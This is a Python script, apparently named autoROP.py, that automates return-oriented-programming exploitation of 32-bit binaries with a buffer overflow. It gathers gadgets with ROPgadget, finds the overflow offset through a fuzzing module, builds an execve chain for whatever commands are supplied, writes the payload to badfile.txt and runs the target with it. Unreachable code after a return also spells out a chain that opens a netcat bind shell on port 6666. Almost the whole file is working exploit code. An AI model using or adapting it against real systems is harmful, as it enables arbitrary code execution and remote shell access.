    # Command line args of vulnerable program binray (maybe uncompiled) and of the commands to insert
    import sys
    import os
    import subprocess
    import struct
    import re
    from struct import pack
    import fuzzing

        

    def find_gadgets (vulnerable_program):
        ROPgadget_call = ["ROPgadget","--binary" ,f"{vulnerable_program}", "--ropchain"]
        
        # run a call through subrocess to get the according gadgetfile

        try:
            result = subprocess.run(ROPgadget_call, capture_output=True, text=True, check=True)
            ropchain_output = result.stdout

            # for testing save to a file called ropchain.txt
            with open("ropchain.txt", "w") as f:
                f.write(ropchain_output)
            # print("ROP chain generated and saved to ropchain.txt")
        except subprocess.CalledProcessError as e:
            print(f"Error running ROPgadget: {e}")
            sys.exit(1)

    def extract_gadgets():
        with open("ropchain.txt", "r") as f:
            ropchain_data = f.read()

        # Dictionary to store found gadgets: { "instruction string" : address_integer }
        gadget_map = {}

        # Regex to capture Address and Instruction
        # Matches: [+] Gadget found: 0x080484a0 pop edx ; ret
        gadget_re = re.compile(r'\[\+\] Gadget found: (0x[0-9a-fA-F]+)\s+(.+)')
        
        for match in gadget_re.finditer(ropchain_data):
            addr_str, instruction = match.groups()
            address = int(addr_str, 16)
            
            # Store in map (Strip whitespace to be safe)
            # If a gadget appears twice, this just updates it with the same/new address (both are valid)
            gadget_map[instruction.strip()] = address

        # Debug: Print what we found to ensure we have them
        # for instr, addr in gadget_map.items():
        #     print(f"Found: {hex(addr)} -> {instr}")

        # --- Retrieve Specific Gadgets by Name ---
        try:
            # 1. MOV [EDX], EAX
            addr_mov = gadget_map['mov dword ptr [edx], eax ; ret']
            MOVISTACK = pack("<I", addr_mov)

            # 2. POP EDX (Clean)
            addr_pop_edx = gadget_map['pop edx ; ret']
            POPEDX = pack("<I", addr_pop_edx)

            # 3. POP EAX
            addr_pop_eax = gadget_map['pop eax ; ret']
            POPEAX = pack("<I", addr_pop_eax)

            # 4. XOR EAX
            addr_xor = gadget_map['xor eax, eax ; ret']
            XOREAX = pack("<I", addr_xor)

            # 5. INC EAX
            addr_inc = gadget_map['inc eax ; ret']
            INCEAX = pack("<I", addr_inc)

            # 6. POP EBX
            addr_pop_ebx = gadget_map['pop ebx ; ret']
            POPEBX = pack("<I", addr_pop_ebx)

            # 7. POP ECX (The Dirty One)
            # We look specifically for the dirty one because that's what your binary has
            addr_pop_ecx = gadget_map['pop ecx ; pop ebx ; ret'] 
            POPECX = pack("<I", addr_pop_ecx)

            # 8. INT 0x80
            addr_int80 = gadget_map['int 0x80']
            INT80 = pack("<I", addr_int80)

        except KeyError as e:
            print(f"CRITICAL ERROR: Could not find gadget for instruction: {e}")
            print("Check ropchain.txt to see if the wording is slightly different.")
            sys.exit(1)

        # --- Get .data Address ---
        data_re = re.compile(r"0x([0-9a-fA-F]+)\)\s*# @ \.data")
        m = data_re.search(ropchain_data)
        if not m:
            print("Error: .data address not found in ropchain.txt")
            sys.exit(1)
        
        data_addr = int(m.group(1), 16)
        STACK = pack("<I", data_addr)
        
        # Padding
        DUMMY = pack("<I", 0x42424242)
        # # print(f"""
        # # MOVISTACK = {MOVISTACK}
        # # POPEDX    = {POPEDX}
        # # POPEAX    = {POPEAX}
        # # XOREAX    = {XOREAX}
        # # INCEAX    = {INCEAX}
        # # POPEBX    = {POPEBX}
        # # POPECX    = {POPECX}
        # # INT80     = {INT80}
        # # STACK     = {STACK}
        # # DUMMY     = {DUMMY}
        # # """)

        # print(f"Successfully parsed gadgets. Data section at: {hex(data_addr)}")
        
        return MOVISTACK, POPEDX, POPEAX, XOREAX, INCEAX, POPEBX, POPECX, INT80, STACK, DUMMY

        # These addresses are taken directly from your WORKING manual script
        # for the vuln1-32 binary.
        
        # # mov dword ptr [edx], eax ; ret
        # MOVISTACK = pack("<I", 0x08057f62) 
        
        # # pop edx ; ret
        # POPEDX    = pack("<I", 0x08058ccc) 
        
        # # pop eax ; ret
        # POPEAX    = pack("<I", 0x0809e16a) 
        
        # # xor eax, eax ; ret
        # XOREAX    = pack("<I", 0x080574f4) 
        
        # # inc eax ; ret
        # INCEAX    = pack("<I", 0x080601e3) 
        
        # # pop ebx ; ret
        # POPEBX    = pack("<I", 0x0804815a) 
        
        # # DIRTY GADGET: pop ecx ; pop ebx ; ret
        # POPECX    = pack("<I", 0x08058cf2) 
        
        # # int 0x80
        # INT80     = pack("<I", 0x08049be9) 
        
        # # .data section (Safe writeable memory)
        # STACK     = pack("<I", 0x080cf020) 
        
        # # Padding for the dirty gadgets
        # DUMMY     = pack("<I", 0x12345678) 

        # return MOVISTACK, POPEDX, POPEAX, XOREAX, INCEAX, POPEBX, POPECX, INT80, STACK, DUMMY
        
        # # finding gadgets from ropchain.txt
        # with open("ropchain.txt", "r") as f:
        #     ropchain_data = f.read()
        #     # want gadgets that look like: 	[+] Gadget found: 0x8057f62 mov dword ptr [edx], eax ; ret

        # # Extract gadgets
        # gadget_re = re.compile(r'\[\+\] Gadget found: (0x[0-9A-Fa-f]+) (.+)')
        # gadgets = gadget_re.findall(ropchain_data)

        # if not gadgets:
        #     print("no gadgets found")
        #     sys.exit(1)

        
        # gadget_addrs = []
        # for addr, desc in gadgets:
        #     # print(f"  Address: {addr}  | {desc}")
        #     gadget_addrs.append(int(addr, 16))   # store clean integers

        # # .data address
        # data_re = re.compile(r"0x([0-9A-Fa-f]+)\)\s*# @ \.data\b")
        # m = data_re.search(ropchain_data)
        # if len(gadget_addrs) < 10:
        #     print("Not enough gadgets found")
        #     sys.exit(1)
        # if not m:
        #     print(".data address not found")
        #     sys.exit(1)

        # data_addr = int(m.group(1), 16)

        # # Map gadgets to variables
        # try:
        #     MOVISTACK = pack("<I", gadget_addrs[0])
        #     POPEDX    = pack("<I", gadget_addrs[1])
        #     POPEAX    = pack("<I", gadget_addrs[2])
        #     XOREAX    = pack("<I", gadget_addrs[3])
        #     INCEAX    = pack("<I", gadget_addrs[5])
        #     POPEBX    = pack("<I", gadget_addrs[6])
        #     POPECX    = pack("<I", gadget_addrs[7])
        #     INT80     = pack("<I", gadget_addrs[9])
        # except IndexError:
        #     print("Gadget index mismatch, wrong gadget order")
        #     sys.exit(1)

        # STACK = pack("<I", data_addr)
        # DUMMY = pack("<I", 0x42424242)

        # # Output check prints
        # # print(f"""
        # # MOVISTACK = {MOVISTACK}
        # # POPEDX    = {POPEDX}
        # # POPEAX    = {POPEAX}
        # # XOREAX    = {XOREAX}
        # # INCEAX    = {INCEAX}
        # # POPEBX    = {POPEBX}
        # # POPECX    = {POPECX}
        # # INT80     = {INT80}
        # # STACK     = {STACK}
        # # DUMMY     = {DUMMY}
        # # """)

        # # print(pack("<I", 0x42424242))

        # return MOVISTACK, POPEDX, POPEAX, XOREAX, INCEAX, POPEBX, POPECX, INT80, STACK, DUMMY

    def build_rop_chain(commands, gadgets):
        # print("Building ROP chain for commands:", commands)
        # Unpack gadgets
        MOVISTACK, POPEDX, POPEAX, XOREAX, INCEAX, POPEBX, POPECX, INT80, STACK, DUMMY = gadgets
        
        # Handle STACK address format
        if isinstance(STACK, bytes):
            stack_addr = struct.unpack("<I", STACK)[0]
        else:
            stack_addr = STACK
        
        buff = b""
        
        
        string_addresses = []
        current_string_addr = stack_addr
        
        for command in commands:

            if len(command) % 4 != 0:
                remainder = 4 - (len(command) % 4)
                if "/" in command:
                    idx = command.index("/")
                    command = command[:idx+1] + ("/" * remainder) + command[idx+1:]
                else:
                    print("Warning: Command length not multiple of 4 and no '/' to pad. ")
                    sys.exit(1)

            
            cmd_bytes = command.encode('latin-1') # Null-terminate the string
            
            for i in range(0, len(cmd_bytes), 4):
                chunk = cmd_bytes[i:i+4]
                if len(chunk) < 4:
                    chunk = chunk + b'\x00' * (4 - len(chunk))
                
    
                buff += POPEDX
                buff += pack("<I", stack_addr) 
    
                buff += POPEAX
                buff += chunk
                

                buff += MOVISTACK
                
                stack_addr += 4
            buff += POPEDX
            buff += pack("<I", stack_addr) # Address to write 0 to
            buff += XOREAX                 # EAX = 0
            buff += MOVISTACK       
            
            stack_addr += 4
            string_addresses.append(current_string_addr)
            current_string_addr = stack_addr

        
        argv_start = stack_addr
        # print("argv start address:", hex(argv_start))
        # print(hex(0x0809e100))
        # print(hex(string_addresses[0]))

        for addr in string_addresses:

            buff += POPEDX
            buff += pack("<I", stack_addr)
            buff += POPEAX
            buff += pack("<I", addr)
            buff += MOVISTACK
            stack_addr +=4
        # Final NULL pointer
        buff += POPEDX
        buff += pack("<I", stack_addr)
        buff += POPEAX
        buff += pack("<I", 0)
        buff += MOVISTACK
        stack_addr += 4


        buff += POPEBX
        buff += pack("<I", string_addresses[0])


        buff += POPECX
        buff += pack("<I", argv_start)
        buff += DUMMY

        buff += POPEBX
        buff += pack("<I", string_addresses[0])

        buff += POPEDX
        buff += pack("<I", 0)

        
        buff += XOREAX
        
        buff += INCEAX*11

        # --- STEP 3: Trigger ---
        buff += INT80

        # print(buff)

        
        return buff

    def example_rop(gadgets):
        
        # Unpack gadgets
        MOVISTACK, POPEDX, POPEAX, XOREAX, INCEAX, POPEBX, POPECX, INT80, STACK, DUMMY = gadgets
        p=b''
        p += pack('<I', 0x08058ccc) # pop edx ; ret
        p += pack('<I', 0x080cf020) # @ .data
        p += pack('<I', 0x0809e16a) # pop eax ; ret
        p += b'/bin'
        p += pack('<I', 0x08057f62) # mov dword ptr [edx], eax ; ret

        p += pack('<I', 0x08058ccc) # pop edx ; ret
        p += pack('<I', 0x080cf024) # @ .data + 4
        p += pack('<I', 0x0809e16a) # pop eax ; ret
        p += b'//sh'
        p += pack('<I', 0x08057f62) # mov dword ptr [edx], eax ; ret

        

        p += pack('<I', 0x08058ccc) # pop edx ; ret
        p += pack('<I', 0x080cf028) # @ .data + 8
        

        p += pack('<I', 0x080574f4) # xor eax, eax ; ret xoreax
        p += pack('<I', 0x08057f62) # mov dword ptr [edx], eax ; ret movstack
        p += pack('<I', 0x0804815a) # pop ebx ; ret popebx
        p += pack('<I', 0x080cf020) # @ .data stackaddr(orig)
        p += pack('<I', 0x08058cf2) # pop ecx ; pop ebx ; ret  popecx
        p += pack('<I', 0x080cf028) # @ .data + 8 stackaddr+8
        p += pack('<I', 0x080cf020) # padding without overwrite ebx stackaddr(orig)
        p += pack('<I', 0x08058ccc) # pop edx ; ret popedx
        p += pack('<I', 0x080cf028) # @ .data + 8 stackaddr+8
        p += pack('<I', 0x080574f4) # xor eax, eax ; ret xoreax
        
        p += pack('<I', 0x080601e3) # inc eax ; ret
        p += pack('<I', 0x080601e3) # inc eax ; ret
        p += pack('<I', 0x080601e3) # inc eax ; ret
        p += pack('<I', 0x080601e3) # inc eax ; ret
        p += pack('<I', 0x080601e3) # inc eax ; ret
        p += pack('<I', 0x080601e3) # inc eax ; ret
        p += pack('<I', 0x080601e3) # inc eax ; ret
        p += pack('<I', 0x080601e3) # inc eax ; ret
        p += pack('<I', 0x080601e3) # inc eax ; ret
        p += pack('<I', 0x080601e3) # inc eax ; ret
        p += pack('<I', 0x080601e3) # inc eax ; ret
        p += pack('<I', 0x08049be9) # int 0x80
        return p
        buff=b""

        buff += POPECX 				# it's via %ecx we will build our stack.
        buff += DUMMY				# padding 
        buff += STACK				# %ecx contain the stack address.
        buff += DUMMY				# padding 
        buff += POPEAX				# Lets put content in an address
        buff += b"/bin"				# put "/usr" in %eax
        buff += MOVISTACK			# put "/bin" in stack address

        buff += POPECX
        buff += DUMMY				# padding 
        buff += pack("<I", 0x080ef240 + 4)	# we change our stack for to point after "/bin"
        buff += DUMMY				# padding 

        buff += POPEAX				# Applying the same for "/nc"
        buff += b"//nc"
        buff += MOVISTACK			# we place "//nc" after "/bin"

        buff += POPECX
        buff += DUMMY				# padding 
        buff += pack("<I", 0x080ef240 + 9)	# we change our stack for to point after "bin//nc"+1
        buff += DUMMY				# padding 

        # we repeated operation for each argument
        buff += POPEAX
        buff += b"-lnp"
        buff += MOVISTACK

        buff += POPECX
        buff += DUMMY
        buff += pack("<I", 0x080ef240 + 14)
        buff += DUMMY

        buff += POPEAX
        buff += b"6666"
        buff += MOVISTACK

        buff += POPECX
        buff += DUMMY
        buff += pack("<I", 0x080ef240 + 19)
        buff += DUMMY

        buff += POPEAX
        buff +=b"-tte"
        buff += MOVISTACK

        buff += POPECX
        buff += DUMMY
        buff += pack("<I", 0x080ef240 + 24)
        buff += DUMMY

        buff += POPEAX
        buff += b"/bin"
        buff += MOVISTACK

        buff += POPECX
        buff += DUMMY
        buff += pack("<I", 0x080ef240 + 28)
        buff += DUMMY

        buff += POPEAX
        buff += "//sh"
        buff += MOVISTACK
        #buff += DUMMY

        #
        # We currently have our list of elements separated by \0
        # Now we must construct our char ** i.e. array 'argguments' of strings
        # arguments=[ @"/bin//nc", @"-lnp", @"6666", @"-tte", @"/bin//sh"]
        # 

        buff += POPECX				
        buff += DUMMY				# padding 
        buff += pack("<I", 0x080ef240 + 60)	# shadow stack address (@ of arguments)
        buff += DUMMY				# padding 

        buff += POPEAX
        buff += pack("<I", 0x080ef240) 		# @ of "/bin//nc" 0th item of arguments[]
        buff += MOVISTACK			# we place address of "/bin//nc" in our STACK

        buff += POPECX
        buff += DUMMY				# padding 
        buff += pack("<I", 0x080ef240 + 64)	# we shift our Stack Pointer + 4 for the second argument
        buff += DUMMY				# padding 

        buff += POPEAX
        buff += pack("<I", 0x080ef249) 		# @ of "-lnp"
        buff += MOVISTACK			# we place address of "-lnp" in our STACK

        buff += POPECX
        buff += DUMMY				# padding 
        buff += pack("<I", 0x080ef240 + 68)	# we shift our Stack Pointer + 4 for the 3rd argument
        buff += DUMMY				# padding 

        buff += POPEAX
        buff += pack("<I", 0x080ef24e) 		# @ of "6666"
        buff += MOVISTACK			# we palce address of "6666" in our STACK

        buff += POPECX
        buff += DUMMY				# padding 
        buff += pack("<I", 0x080ef240 + 72)	# we shift our Stack Pointer + 4 for the 4th argument
        buff += DUMMY				# padding 

        buff += POPEAX
        buff += pack("<I", 0x080ef253) 		# @ of "-tte"
        buff += MOVISTACK			# we place address of "-tte" in our STACK

        buff += POPECX
        buff += DUMMY				# padding 
        buff += pack("<I", 0x080ef240 + 76)	# we shift our Stack Pointer + 4 for the 5th argument
        buff += DUMMY				# padding 

        buff += POPEAX
        buff += pack("<I", 0x080ef258) 		# @ of "/bin//sh"
        buff += MOVISTACK			# we place address of "/bin//sh" in our STACK

            #
            # Now we must implement eax to contain the address of 
            # the execve syscall.
            # execve = 0xb
            #

        buff += XOREAX				# %eax is put to zero.
        buff += INCEAX * 11			# %eax is now 0xb
        buff += POPECX				# last pop 
        buff += pack("<I", 0x080ef240 + 48) 	# edx char *env
        buff += pack("<I", 0x080ef240 + 60) 	# ecx char **arguments
        buff += pack("<I", 0x080ef240)      	# ebx "/usr/bin//nc"
        buff += INT80				# we execute

        return buff


    def main():
        if len(sys.argv) < 3:
            print("Usage: python3 autoROP.py <vulnerable_program> <command1> [<command2> ...]")
            sys.exit(1)

        vulnerable_program = sys.argv[1]
        commands = sys.argv[2:]

        # Check if the vulnerable program exists
        if not os.path.isfile(vulnerable_program):
            print(f"Error: The file {vulnerable_program} does not exist.")
            sys.exit(1)


        # Step 1: Extract gadgets using ROPgadget
        find_gadgets(vulnerable_program)
        print("Gadgets extracted using ROPgadget.")

        # Step 2: Parse ropchain.txt to find gadgets and .data address

        (gadgets) = extract_gadgets()
        print("Gadgets extracted from ropchain.txt.")

        # Step 3: Find Buffer Overflow Offset

        file_input = fuzzing.find_if_fileinput(vulnerable_program)
        p = b'A' * fuzzing.find_offset(vulnerable_program, file_input)
        print(f"Buffer overflow offset found: {len(p)} bytes.")

        # Step 4: Build ROP Chain for each command

        rop_chain  = build_rop_chain(commands, gadgets)
        p += rop_chain
        print(f"ROP chain built with size {len(rop_chain)} bytes.")

        # Step 5: Write to badfile.txt
        with open("badfile.txt", "wb") as f:
            f.write(p)
        print(f"ROP chain written to badfile.txt with total size {len(p)} bytes.")

        # Run the vulnerable program with the payload
        if file_input:
            subprocess.run([f"./{vulnerable_program}", "badfile.txt"])
        else:
            subprocess.run([f"(cat badfile.txt; cat) | ./{vulnerable_program}"], shell=True)
            print("Press RETURN to continue...")

        
        

    main()
